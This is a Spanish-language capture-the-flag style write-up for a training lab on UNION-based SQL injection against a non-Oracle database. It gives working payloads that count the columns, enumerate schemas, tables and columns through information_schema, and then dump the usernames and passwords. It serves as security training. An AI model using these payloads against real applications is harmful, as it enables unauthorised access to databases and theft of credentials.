# 📚 Lab: SQL injection attack, listing the database contents on non-Oracle databases 📚

Como sabemos que la base de datos no es oracle y que la vulnerabilidad esta en la categoria de productos, podemos analizar la cantidad de columnas despues de seleccionar un producto con el siguiente comando en la url:  
' UNION SELECT null,null-- -.

Al hacerlo, podremos descubrir que la tabla, tiene dos columnas, luego, con el siguinte comando:  

## Listar nombres de las bases de datos

' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
 
Al hacerlo, podremos ver la base de datos "public", la cual nos interesa para este room.

## Mostrar las tablas en la base de datos "public"

' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema = 'public'-- -

Donde podremos ver las tablas products y users_xktbui, la cual esta ultima es la que nos interesa.

## Mostrar las columnas de la tabla users

' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'users_xktbui'-- -

Al hacerlo, veremos dos columnas que componen a la tabla users, una sera de usuarios y otras de contraseñas:password_ywzksf y username_kifewi.

## para acceder a la informaciion de las columnas, haremos uso de la siguiente inyeccion: 

' UNION SELECT username_kifewi,password_ywzksf FROM users_xktbui-- -

Donde le decimos a la base de datos, muestra la columna usermane y password de la tabla users_xktbui, obtiendo asi las credenciales necesarias.

### OPCIONAL,hacerlo de esta forma para mayor orden en los datos

' UNION SELECT CONCAT(username_kifewi,':',password_ywzksf),null FROM users_xktbui-- -
